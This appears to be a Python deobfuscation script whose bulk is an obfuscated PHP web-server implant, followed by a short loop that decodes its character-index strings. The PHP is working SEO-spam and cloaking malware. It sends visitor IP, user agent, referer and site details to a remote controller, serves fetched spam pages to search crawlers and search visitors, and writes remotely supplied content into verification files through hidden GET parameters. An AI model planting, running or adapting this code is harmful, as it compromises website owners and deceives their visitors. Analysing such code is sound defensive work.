script = """
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
date_default_timezone_set("PRC");

$password = 'fr003xy';

$O = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_-\"?> <.-=:/1230654879';()&^$[]\\%{}!*|";


$document_root = @$_SERVER["DOCUMENT_ROOT"];
$request_uri = @$_SERVER["REQUEST_URI"];
// the name of the script file being executed (so "index.php")
$script_name = @basename(__FILE__);
$hostname = @$_SERVER["HTTP_HOST"];
$language = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];

$user_agent = @$_SERVER["HTTP_USER_AGENT"];
$referer = @$_SERVER["HTTP_REFERER"];
$protocol = ((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") || (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https")) ? "https://" : "http://";
$base_url = $protocol . $hostname;
$user_agent = @strtolower($user_agent);
$referer = @strtolower($referer);


if (getenv("HTTP_CLIENT_IP")) {
    $oo00oo00 = getenv("HTTP_CLIENT_IP");
} elseif (getenv($O[41] . $O[30] . $O[30] . $O[35] . $O[52] . $O[46] . $O[52] . $O[39] . $O[34] . $O[29] . $O[27] . $O[36] . $O[29] . $O[38] . $O[28] . $O[38] . $O[52] . $O[39] . $O[34] . $O[29])) {$oo00oo00 = getenv($O[41] . $O[30] . $O[30] . $O[35] . $O[52] . $O[46] . $O[52] . $O[39] . $O[34] . $O[29] . $O[27] . $O[36] . $O[29] . $O[38] . $O[28] . $O[38] . $O[52] . $O[39] . $O[34] . $O[29]);
} elseif (getenv($O[29] . $O[28] . $O[51] . $O[34] . $O[30] . $O[28] . $O[52] . $O[36] . $O[38] . $O[38] . $O[29])) {$oo00oo00 = getenv($O[29] . $O[28] . $O[51] . $O[34] . $O[30] . $O[28] . $O[52] . $O[36] . $O[38] . $O[38] . $O[29]);
} else {$oo00oo00 = $_SERVER[$O[29] . $O[28] . $O[51] . $O[34] . $O[30] . $O[28] . $O[52] . $O[36] . $O[38] . $O[38] . $O[29]];
}
if (isset($_GET[$O[22] . $O[13]]) && $_GET[$O[22] . $O[13]] == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[57] . $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[88];
    exit;
}
$Ooooo = dirname($request_uri);
if (strstr($request_uri, $O[11] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[52] . $O[7] . $O[24] . $O[12] . $O[2] . $O[20] . $O[52])) {OooooOOOOoo($O, $password
, $base_url, $request_uri, $hostname, $protocol, $Ooooo, $script_name);
}
if (strstr($request_uri, $O[59] . $O[20] . $O[25] . $O[18])) {OooooO($O, $password
, $base_url, $request_uri, $protocol, $hostname, $oo00oo00, $Ooooo, $script_name);
}
function OooooOOOOoo($O, $password, $base_url, $request_uri, $hostname, $protocol, $Ooooo, $script_name)
{$Oooooo = $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
 . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[36] . $O[9] . $O[7] . $O[63] . $O[11] . $O[7] . $O[4] . $O[2] . $O[36] . $O[18] . $O[18] . $O[51] . $O[10] . $O[9] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri
 . $O[78] . $O[9] . $O[1] . $O[12] . $O[61] . $O[11] . $O[18] . $O[64] . $O[65] . $O[66] . $O[78] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $base_url . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name;
    if (isset($_GET[$O[22] . $O[13] . $O[52] . $O[10] . $O[18] . $O[18] . $O[25] . $O[10] . $O[9]]) && $_GET[$O[22] . $O[13] . $O[52] . $O[10] . $O[18] . $O[18] . $O[25] . $O[10] . $O[9]] == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $Oooooo;
        exit;
    }
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (empty($Ooooooo) || $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 404) {header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        header($O[37] . $O[4] . $O[10] . $O[4] . $O[6] . $O[11] . $O[62] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        exit();
    }
    if (empty($Ooooooo) || $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 444) {header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        header($O[37] . $O[4] . $O[10] . $O[4] . $O[6] . $O[11] . $O[62] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        exit();
    }
    $Oooooooo = $Ooooooo[$O[12] . $O[10] . $O[4] . $O[10]];
    header($O[47] . $O[8] . $O[24] . $O[4] . $O[2] . $O[24] . $O[4] . $O[53] . $O[4] . $O[5] . $O[9] . $O[2] . $O[62] . $O[4] . $O[2] . $O[20] . $O[4] . $O[63] . $O[20] . $O[25] . $O[18]);
    echo $Oooooooo;
    exit();
}
function OooooO($O, $password, $base_url, $request_uri, $protocol, $hostname, $oo00oo00, $Ooooo = '', $script_name = '')
{$Oooooo = $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
 . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[36] . $O[9] . $O[7] . $O[63] . $O[11] . $O[7] . $O[4] . $O[2] . $O[32] . $O[3] . $O[18] . $O[36] . $O[9] . $O[7] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[11] . $O[4] . $O[5] . $O[9] . $O[2] . $O[61] . $O[11] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[78] . $O[24] . $O[6] . $O[25] . $O[61] . $O[68] . $O[67] . $O[67] . $O[67] . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[6] . $O[3] . $O[18] . $O[61] . $request_uri
 . $O[78] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $base_url . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name;
    if (isset($_GET[$O[22] . $O[13] . $O[52] . $O[25] . $O[10] . $O[9]]) && $_GET[$O[22] . $O[13] . $O[52] . $O[25] . $O[10] . $O[9]] == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $Oooooo;
        exit;
    }
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (isset($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]]) && $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == $O[68] . $O[67] . $O[67]) {$Oooooooo = $Ooooooo[$O[12] . $O[10] . $O[4] . $O[10]];
        foreach ($Oooooooo as $Oog => $Oov) {$o0o0oooo = OooooOO($O, $Oov);
            $Oooo0s = (strpos($o0o0oooo, $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[57] . $O[50] . $O[8] . $O[4] . $O[7] . $O[13] . $O[7] . $O[21] . $O[10] . $O[4] . $O[7] . $O[8] . $O[24] . $O[57] . $O[29] . $O[2] . $O[21] . $O[2] . $O[7] . $O[22] . $O[2] . $O[12]) !== false) ? $O[34] . $O[43] : $O[28] . $O[29] . $O[29] . $O[34] . $O[29];
            echo $Oov . $O[61] . $O[61] . $O[61] . $O[56] . $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[62] . $O[57] . $Oooo0s . PHP_EOL;
        }
        exit();
    }
    if (isset($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]]) && $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == $O[70] . $O[67] . $O[68]) {echo $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[57] . $O[29] . $O[2] . $O[4] . $O[6] . $O[3] . $O[24] . $O[57] . $O[39] . $O[10] . $O[7] . $O[18];
        exit();
    }
    if (empty($Ooooooo) || $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 404) {header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        header($O[37] . $O[4] . $O[10] . $O[4] . $O[6] . $O[11] . $O[62] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        exit();
    }
    $Oooooooo = $Ooooooo[$O[12] . $O[10] . $O[4] . $O[10]];
    header($O[47] . $O[8] . $O[24] . $O[4] . $O[2] . $O[24] . $O[4] . $O[53] . $O[4] . $O[5] . $O[9] . $O[2] . $O[62] . $O[4] . $O[2] . $O[20] . $O[4] . $O[63] . $O[20] . $O[25] . $O[18]);
    echo $Oooooooo;
    exit();
}
if (isset($_GET[$O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2]])) {$OoOO = $_GET[$O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2]];
    if (preg_match($O[63] . $O[79] . $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[59] . $O[89] . $O[55] . $O[76] . $O[83] . $O[59] . $O[15] . $O[4] . $O[25] . $O[18] . $O[77] . $O[80] . $O[63] . $O[7], $OoOO)) {if (OooooOOOO($O, $OoOO, $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[53] . $O[11] . $O[7] . $O[4] . $O[2] . $O[53] . $O[22] . $O[2] . $O[3] . $O[7] . $O[13] . $O[7] . $O[21] . $O[10] . $O[4] . $O[7] . $O[8] . $O[24] . $O[62] . ' ' . $OoOO)) {exit($O[58] . $O[10] . $O[57] . $O[15] . $O[3] . $O[2] . $O[13] . $O[61] . $OoOO . $O[56] . $OoOO . $O[58] . $O[63] . $O[10] . $O[56]);
        } else {exit($O[13] . $O[10] . $O[7] . $O[18] . $O[88] . $O[88] . $O[88] . $O[88]);
        }
    }
}
if (isset($_GET[$O[3] . $O[8] . $O[23] . $O[8] . $O[4] . $O[11]])) {$both = '';
    $o0o0o = $_GET[$O[3] . $O[8] . $O[23] . $O[8] . $O[4] . $O[11]];
    $Oooooo = $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
 . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[36] . $O[9] . $O[7] . $O[63] . $O[3] . $O[8] . $O[23] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[3] . $O[8] . $O[23] . $O[61] . $o0o0o . $O[78] . $O[9] . $O[1] . $O[12] . $O[61] . $O[11] . $O[18] . $O[64] . $O[65] . $O[66] . $O[78] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $base_url . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name;
    if ($o0o0o == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $Oooooo;
        exit;
    }
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (empty($Ooooooo) || $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 404) {header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        header($O[37] . $O[4] . $O[10] . $O[4] . $O[6] . $O[11] . $O[62] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        exit();
    }
    $Oooooooo = $Ooooooo[$O[12] . $O[10] . $O[4] . $O[10]];
    if (OooooOOOO($O, $O[3] . $O[8] . $O[23] . $O[8] . $O[4] . $O[11] . $O[59] . $O[4] . $O[20] . $O[4], $Oooooooo)) {echo $Oooooooo;
        exit();
    } else {exit($O[13] . $O[10] . $O[7] . $O[18] . $O[88] . $O[88] . $O[88]);
    }
}
if (preg_match($O[63] . $O[5] . $O[10] . $O[15] . $O[8] . $O[8] . $O[76] . $O[55] . $O[88] . $O[83] . $O[59] . $O[21] . $O[8] . $O[83] . $O[59] . $O[16] . $O[9] . $O[77] . $O[90] . $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[76] . $O[55] . $O[88] . $O[83] . $O[59] . $O[21] . $O[8] . $O[83] . $O[59] . $O[16] . $O[9] . $O[77] . $O[90] . $O[23] . $O[7] . $O[24] . $O[14] . $O[63] . $O[7], $referer)) {if (isset($_GET[$O[22] . $O[13] . $O[52] . $O[16] . $O[6] . $O[25] . $O[9]]) && $_GET[$O[22] . $O[13] . $O[52] . $O[16] . $O[6] . $O[25] . $O[9]] == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
     . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[16] . $O[6] . $O[25] . $O[9] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $hostname . $O[78] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri
     . $O[78] . $O[23] . $O[8] . $O[4] . $O[61] . $O[67] . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[3] . $O[2] . $O[13] . $O[2] . $O[3] . $O[61] . $referer . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[18] . $O[14] . $O[61] . $language . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name;
        exit;
    }
    $o0o0ooo = OooooOO($O, $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
 . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[16] . $O[6] . $O[25] . $O[9] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $hostname . $O[78] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri
 . $O[78] . $O[23] . $O[8] . $O[4] . $O[61] . $O[67] . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[3] . $O[2] . $O[13] . $O[2] . $O[3] . $O[61] . $referer . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[18] . $O[14] . $O[61] . $language . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name);
    if ($o0o0ooo) {echo $o0o0ooo;
        exit();
    }
}
if (stristr($user_agent, $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[23] . $O[8] . $O[4]) || stristr($user_agent, $O[23] . $O[7] . $O[24] . $O[14]) || stristr($user_agent, $O[31] . $O[88] . $O[42]) || stristr($user_agent, $O[5] . $O[88] . $O[16]) || stristr($user_agent, $O[5] . $O[10] . $O[15] . $O[8] . $O[8]) || stristr($user_agent, $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2]) || stristr($user_agent, $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[23] . $O[8] . $O[4]) || stristr($user_agent, $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[23] . $O[8] . $O[4])) {if (isset($_GET[$O[22] . $O[13] . $O[52] . $O[23] . $O[8] . $O[4]]) && $_GET[$O[22] . $O[13] . $O[52] . $O[23] . $O[8] . $O[4]] == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
     . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[73] . $O[64] . $O[71] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $hostname . $O[78] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri
     . $O[78] . $O[23] . $O[8] . $O[4] . $O[61] . $O[64] . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[18] . $O[14] . $O[61] . $language . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name;
        exit;
    }
    $OooOO = OooooOO($O, $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
 . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[73] . $O[64] . $O[71] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $hostname . $O[78] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri
 . $O[78] . $O[23] . $O[8] . $O[4] . $O[61] . $O[64] . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[18] . $O[14] . $O[61] . $language . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name);
    if (!empty($OooOO)) {$Ooooooo = json_decode($OooOO, true);
        if ($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 404) {header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
            header($O[37] . $O[4] . $O[10] . $O[4] . $O[6] . $O[11] . $O[62] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
            exit();
        }
        if ($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 500) {header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[64] . $O[57] . $O[69] . $O[67] . $O[67] . $O[57] . $O[33] . $O[24] . $O[4] . $O[2] . $O[3] . $O[24] . $O[10] . $O[18] . $O[57] . $O[37] . $O[2] . $O[3] . $O[22] . $O[2] . $O[3] . $O[57] . $O[28] . $O[3] . $O[3] . $O[8] . $O[3]);
            exit();
        }
        echo $OooOO;
        exit;
    }
}
if (isset($_GET[$O[22] . $O[13] . $O[52] . $O[8] . $O[3] . $O[7] . $O[14] . $O[7] . $O[24]]) && $_GET[$O[22] . $O[13] . $O[52] . $O[8] . $O[3] . $O[7] . $O[14] . $O[7] . $O[24]] == $O[8] . $O[24] . $O[18] . $O[7] . $O[24] . $O[2] . $O[69] . $O[69] . $O[68] . $O[68]) {echo $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password
 . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[8] . $O[3] . $O[14] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $hostname . $O[78] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri
 . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[18] . $O[14] . $O[61] . $language . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name;
    exit;
}
OooooOO($O, $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $password . $O[59] . $O[13] . $O[8] . $O[3] . $O[21] . $O[2] . $O[7] . $O[2] . $O[59] . $O[4] . $O[8] . $O[9] . $O[63] . $O[8] . $O[3] . $O[14] . $O[59] . $O[9] . $O[15] . $O[9] . $O[55] . $O[12] . $O[8] . $O[25] . $O[10] . $O[7] . $O[24] . $O[61] . $hostname . $O[78] . $O[9] . $O[10] . $O[14] . $O[2] . $O[61] . $request_uri . $O[78] . $O[9] . $O[3] . $O[61] . $Ooooo . $O[78] . $O[7] . $O[9] . $O[61] . $oo00oo00 . $O[78] . $O[18] . $O[14] . $O[61] . $language . $O[78] . $O[21] . $O[6] . $O[3] . $O[61] . $script_name);
function OooooOO($O, $OooO)
{$OooOO = '';
    $OooOOO = $O[51] . $O[8] . $O[19] . $O[7] . $O[18] . $O[18] . $O[10] . $O[63] . $O[70] . $O[59] . $O[67] . $O[57] . $O[76] . $O[21] . $O[8] . $O[25] . $O[9] . $O[10] . $O[4] . $O[7] . $O[23] . $O[18] . $O[2] . $O[75] . $O[51] . $O[37] . $O[33] . $O[28] . $O[57] . $O[68] . $O[59] . $O[67] . $O[75] . $O[27] . $O[7] . $O[24] . $O[12] . $O[8] . $O[1] . $O[11] . $O[57] . $O[50] . $O[30] . $O[57] . $O[69] . $O[59] . $O[65] . $O[75] . $O[59] . $O[50] . $O[28] . $O[30] . $O[57] . $O[47] . $O[44] . $O[29] . $O[57] . $O[64] . $O[59] . $O[64] . $O[59] . $O[70] . $O[66] . $O[65] . $O[65] . $O[77];
    if (function_exists($O[21] . $O[6] . $O[3] . $O[18] . $O[52] . $O[7] . $O[24] . $O[7] . $O[4])) {try {$OooOOOO = curl_init();
            $OoooOO = 30;
            curl_setopt($OooOOOO, CURLOPT_URL, $OooO);
            curl_setopt($OooOOOO, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($OooOOOO, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($OooOOOO, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($OooOOOO, CURLOPT_CONNECTTIMEOUT, $OoooOO);
            $OooOO = curl_exec($OooOOOO);
            curl_close($OooOOOO);
        } catch (Exception $e) {}
    }
    if (strlen($OooOO) < 1 && function_exists($O[13] . $O[7] . $O[18] . $O[2] . $O[52] . $O[14] . $O[2] . $O[4] . $O[52] . $O[21] . $O[8] . $O[24] . $O[4] . $O[2] . $O[24] . $O[4] . $O[11])) {ini_set($O[6] . $O[11] . $O[2] . $O[3] . $O[52] . $O[10] . $O[14] . $O[2] . $O[24] . $O[4], $OooOOO);
        try {$OooOO = @file_get_contents($OooO);
        } catch (Exception $e) {}
    }
    return $OooOO;
}
function OooooOOOO($O, $Ooo, $OooOOOOO)
{$OoooO = fopen($Ooo, $O[1]) or die('0');
    $result = fwrite($OoooO, $OooOOOOO);
    fclose($OoooO);
    return $result;
}
"""

alphabet = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_-\"?> <.-=:/1230654879';()&^$[]\\%{}!*|"

count = 0
for char in alphabet:
    if char == "\"" or char == "\\":
        char = "\\" + char
    script = script.replace(f"$O[{count}]", f"\"{char}\"")
    count = count + 1

print(script)